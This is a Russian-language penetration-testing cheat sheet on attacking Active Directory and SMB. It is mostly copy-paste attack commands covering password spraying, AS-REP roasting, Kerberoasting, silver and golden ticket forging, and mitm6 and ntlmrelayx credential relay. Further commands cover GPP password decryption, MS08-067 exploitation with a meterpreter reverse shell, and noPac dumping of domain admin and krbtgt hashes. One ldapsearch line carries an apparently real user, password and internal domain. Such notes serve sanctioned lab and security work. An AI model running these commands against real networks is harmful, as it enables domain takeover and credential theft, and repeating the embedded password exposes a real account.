	crackmapexec smb 10.10.11.222 -u '' -p '' --shares   -анонимный вход

	парольные политики

	crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' --pass-pol

	crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' --local-auth --sam

	Перечисление открытых шар сети

	crackmapexec smb 192.168.50.200/24

	crackmapexec smb 192.168.50.162 -u 'Kevin' -p dict.txt (Password spray)

	

**************************************************************************************************************************************

https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-domain-users

-------------------------------------------------снаружи домена 
сенить пароль пользователя smb

smbpasswd -r razo.thm -U bardkey

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# RPC client (использует smb)
rpcclient 10.10.38.153 -U nik - нужен пароль - может перечислять пользователей и группы в Домене  (Remote Procedure Call работает на портах TCP 135 и UDP 135)

rpcclient 10.10.38.153 -U "" -N  - не нужен пароль

enumdomusers - перчисляет пользователей 

enumdomgroup - перечисляет группы

queryusergroups 0x47b - к какой группе принадлежит

querygroup 0x201 - что за группа

queryuser 0x47b - инфо о пользователе

 Она может использоваться для выполнения различных действий, таких как получение информации о доступных службах, выполнение удаленных процедур и т. д.

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# LDAP (Стоит проверить, разрешает ли служба LDAP анонимные привязки, с помощью инструмента ldapsearch.- имена даты пароли и т.д все выдвет!!!!)

!!!!!Временные метки ЛДАП

	ldapsearch -x -H ldap://sizzle.htb.local -s base namingcontexts

https://www.epochconverter.com/ldap

	ldapsearch -H ldap://192.168.2.251 -x -D 'ЛаврентьевАВ@ta-d.local' -w '414216819' -b 'dc=ta-d,dc=local' "(&(objectClass=user)(memberOf=CN=Администраторы домена,CN=Users,DC=ta-d,DC=local))" | grep sAMAccountName

---Выбираем user из группы Администраторы домена

ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName    (выбираем имена)

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local" '(objectClass=User)' (толлко юзеры!!!)


(может сразу не работать!!!)

ldapsearch -H ldap://10.10.10.161 -x

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local"

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName

ldapsearch -H ldap://dc1.scrm.local -U ksimpson -b 'dc=scrm,dc=local'

	ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts (Инфо о домене)
 	
	ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' (Инфо в домене)

 	cat ldap_info| awk '{print $1}' | sort| uniq -c| sort -nr | grep ':'


можно попробовать -
[windapsearch](https://github.com/ropnop/windapsearch)

-------------еще энумерация LDAP и поиск доменных юзеров------------------------

impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -all

------------еще ldap-shell

https://github.com/PShlyundin/ldap_shell


# KERBRUTE

https://github.com/ropnop/kerberos_windows_scripts/blob/master/kinit_horizontal_brute.sh

https://github.com/ropnop/kerbrute

./kerbrute_linux_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt  (Проверка валидных пользоввателей с преатентификациеей)

~/kerbrute_linux_amd64 userenum --dc 10.10.10.52 -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (Проверка валидных пользоввателей с преатентификациеей)


./kerbrute_linux_amd64 passwordspray --dc 192.168.1.19 -d ignite.local users.txt Password@1  (Распыление пароля)

./kerbrute_linux_amd64 bruteuser --dc 192.168.1.19 -d ignite.local pass.txt username

kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb

 Может не сработать тогда надо -->>>  crackmapexec smb 10.10.10.248 -u username.txt -p NewIntelligenceCorpUser9876 

# Поиск учетных записей без преаутентификации керберос (НУЖЕН СПИСОК ПОЛЬЗОВАТЕЛЕЙ)

python3 GetNPUsers.py enterprise.thm/ -dc-ip 10.10.38.153 -usersfile /home/max/users.txt -no-pass

impacket-GetNPUsers -no-pass raz0rblack.thm/ -usersfile user.txt -format hashcat -outputfile hash.txt

(НУЖНА АУТЕНТ ПО КЕРБЕРОС И НЕ НУЖНА)

impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile forest_user

impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile forest_user -request

impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/' (без списка пользователей)

# Получение идентификатора домена

impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson

#Получить идентификатор пользователя

rpcclient $> lookupnames james(username)

# Получить TGT

impacket-getTGT scrm.local/ksimpson:ksimpson (домен/логин:пароль)

export KRB5CCNAME=ksimpson.ccache

sudo apt-get install krb5-user

kinit OOREND@REBOUND.HTB (также получить тикет и кеширует на диске)

klist - список билетов керберос

# Создание Silver Ticket для Administrator

impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local

(хеш - ntlm хеш пароля службы) 

# Сщздание голден тикет из-за уязвимости ms14

goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'

# Глянуть SPN (НУЖЕН ПОЛЬЗОВАТЕЛЬ И ПАРОЛЬ)

python3 GetUserSPNs.py -dc-ip 10.10.154.84 lab.enterprise.thm/nik:ToastyBoi! -request

impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request

---получение SPN по билету TGT

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -no-pass

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -no-pass -request


"setspn -T TestDomain -Q */*"  (Теперь производится поиск доступных SPN в текущей среде при помощи следующей команды:)



# dacledit 

dacledit.py -action 'write' -rights 'WriteMembers' -principal 'm.lovegod' -target 'Network Audit group' 'absolute.htb'/'m.lovegod:AbsoluteLDAP2022!' -k -dc-ip 10.10.11.181

# Для взлома билета удаленной (SPN) службы используется скрипт tgsrepcrack.py из репозитория Kerberoast. 

python tgsrepcrack.py wordlist.txt 1-40a10000-Bob@MSSQLSERVER~SQL-Server.testdomain.com~1433-TESTDOMAIN.COM.kirbi


# скрипты для сканирования уязвимостей
script vuln -p 80 ip скрипты уязвимостей
nmap [host] --script vuln -sV
https://github.com/SkillfactoryCoding/HACKER-OS-nmap.vulners
https://github.com/SkillfactoryCoding/HACKER-OS-vulscan

printnightMare (135 port)
impacket-rpcdump @10.10.211.217 | egrep 'MS-RPRN|MS-PAR'

# Responder (слушаем интерфейс) IPv4

sudo responder -I tun0 -wdF

sudo tcpdump -i wlan0 icmp

# mitm6 слушаем IPv6 (поддельный DHCPv6-сервер)

 	1. sudo mitm6 -d bank.ats --ignore-nofqdn
	Пояснение:

	mitm6 — инструмент, который выдает себя за DHCPv6-сервер в локальной сети.

	-d bank.ats — указывает домен, для которого mitm6 будет авторитетным DNS-сервером (в данном случае bank.ats).

	--ignore-nofqdn — опция позволяет обрабатывать запросы даже от клиентов, не имеющих полного доменного имени (FQDN) .

	Что происходит: Mitm6 использует тот факт, что Windows (начиная с Vista) по умолчанию запрашивает конфигурацию IPv6 через DHCPv6. Он отвечает на эти запросы, назначая клиентам IPv6-адреса и указывая себя в качестве DNS-сервера. Поскольку IPv6 имеет приоритет над IPv4 в Windows, все DNS-запросы (включая IPv4) начинают направляться на сервер злоумышленника .

	2. Запуск ntlmrelayx для перехвата и ретрансляции запросов

	sudo ntlmrelayx.py -6 -t ldaps://dc.bank.ats -wh fakewpad.bank.ats -l lootdir
	Пояснение параметров:

	-6 — указывает, что ntlmrelayx должен работать поверх IPv6.

	-t ldaps://dc.bank.ats — целевой сервер, на который будут ретранслироваться аутентификационные данные (в данном случае контроллер домена dc.bank.ats по защищенному LDAPS). Это мог бы быть и другой протокол, например, http:// или smb:// .

	-wh fakewpad.bank.ats — опция для размещения поддельного файла WPAD (Web Proxy Auto-Discovery). Это заставляет жертв использовать сервер злоумышленника в качестве прокси, что часто провоцирует отправку NTLM-хэшей .

	-l lootdir — указывает директорию, куда будут сохраняться результаты атаки (например, перехваченные хэши, дампы SAM и т.д.) 

# rsync

rsync --list-only 10.129.228.37::

rsync --list-only 10.129.228.37::public


rsync 10.129.228.37::public/flag.txt flag.txt


# CVE-2014-1812 — это критическая уязвимость в механизме Group Policy Preferences (GPP) Microsoft Windows, которая позволяет аутентифицированному злоумышленнику получать и расшифровывать пароли, хранящиеся в политиках домена		(доступ SYSVOL или другие открытые ресурсы SMB, где могут храниться XML-файлы GPP)
		* Расшифровка пароля из XML для груповой политики для старых Windows в файлах XML в общей папке SYSVOL
		
		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> --shares
		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M spider_plus --spider-share SYSVOL --spider-folder Policies
		 
  		gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
		
		Metasploit: use auxiliary/scanner/smb/smb_enum_gpp
		set RHOSTS <IP_DC>
		set SMBUser <user>
		set SMBPass <password>
		run
		
		
		
		smbclient //<target_ip>/SYSVOL -N
		ls
		get Policies\{Policy_GUID}\Machine\Preferences\Groups\Groups.xml
		

		use auxiliary/scanner/smb/smb_enum_gpp
		set RHOSTS <target_ip_or_range>
		set SMBSHARE SYSVOL  # Можно изменить на другой ресурс, например, Replication
		run
		
# Уязвимость MS14-068 (CVE-2014-6324) (CVE-2014-6324 (MS14-068) — это критическая уязвимость в протоколе Kerberos в Microsoft Windows, которая позволяет повысить привилегии обычного пользователя домена до уровня доменного администратора. Уязвимость существует в реализации проверки подписи PAC (Privilege Attribute Certificate) в билетах Kerberos)

	use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
	set RHOST <DC_IP>
	set USERNAME <user>
	set PASSWORD <password>
	set DOMAIN <domain.com>
	run

	systeminfo | find "KB3011780" (проверить обновление)

# Уязвимость MS08-067
	nmap --script smb-vuln-ms08-067 -p445 <целевой IP-адрес>		(но может завалить систему)

	msfconsole
	search ms08-067 checker или search ms08-067 scanner				(просто проверить на наличие уязвимости)
	
	search ms08-067
	use exploit/windows/smb/ms08_067_netapi
	show options
	set Rhosts
	set PAYLOAD windows/meterpreter/reverse_tcp
	exploit
	
# Недостатки канального уровня (sudo yersinia -I)
	При исследовании сетевого трафика были выявлены сетевые пакеты инфраструктурных протоколов CDP, VTP и STP. Данные протоколы имеют ряд недостатков. Протокол CDP раскрывает информацию о сетевом оборудовании, сетевых адресах и имени маршрутизатора
	Для протокола STP рекомендуется включить механизм BPDUFilter, который выполняет блокировку входящих BPDU-пакетов без выключения порта.
	Для протокола VTP рекомендуется использовать протокол VTPv3.
	
# Перебор пользователей через ssh
	scanner/ssh/ssh_enumusers
# NoPac
	git clone https://github.com/Ridter/noPac.git
	netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ -проверяем машина квота
	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac  - проверяем нопак
	
	python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  ---- - проверяем нопак
	
	python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump   --- дампим все
	python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt		--- дампим krbtgt

	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ

# Pre2k

	git clone https://github.com/garrettfoster13/pre2k.git
	cd pre2k
	ls
	pipx install .
	pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
	
